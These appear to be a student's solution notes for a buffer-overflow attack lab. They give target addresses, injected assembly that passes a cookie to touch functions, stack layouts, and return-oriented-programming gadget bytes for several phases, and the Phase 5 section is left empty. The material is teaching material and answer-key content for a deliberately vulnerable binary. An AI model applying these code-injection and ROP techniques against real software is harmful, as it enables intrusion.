## Phase 1

0x401967 --> 0x4017c0

## Phase 2

Set return address of getbuf() to next byte in $rsp, i.e. ($rsp) = $rsp + 8, which point to following instructions:

```
pushq $0x4017ec       # push address of touch2() as return value
movq $0x59b997fa,%rdi # pass cookie to first argument of touch2()
ret                   # return to touch2()
```

```
movq $0x59b997fa,%rdi
ret
```

## Phase 3

byte sequence of string representation of 0x59b997fa is

```
35 39 62 39 39 37 66 61
```

### Solution 1

Stack:

```
+------------------------+
| STRING                 |
|                        |
| INSTRUCTION <<---------------+
|                        |     |
| RETURN1 ---------------------+
+------------------------+
```

Instructions:

```
pushq $0x4018fa
leaq 0x16(%rsp),%rdi
ret
```

### Solution 2

Stack

```
STRING  <--+
           |
leaq 0x16(%rsp),%rdi  <------+
                             |
ADDR2   -> touch3()          |
                             |
ADDR1 -----------------------+
```

Instructions:

```
leaq 0x16(%rsp),%rdi
ret
```

## Phase 4

Stack:

```
ADDR3       --> touch2()
ADDR2       --> movl %eax,%edi
0x59b997fa
ADDR1       --> popq %rax
```

## Phase 5

## Reference

In `farm.d`, there are

```
89 c7 90    # movl %eax,%edi -> 0x4019c6
89 c2 90    # movl %eax,%edx
89 ce 90    # movl %ecx,%esi
89 e0 90    # movl %exp,%eax

48 89 c7 90 # movq %rax,%rdi
48 89 e0 90 # movq %rsp,%rax

58 90       # popq %rax      -> 0x4019ab

20 c0       # andb %al,%al
84 c0       # testb %al,%al
38 c0       # cmpb %al,%al
```
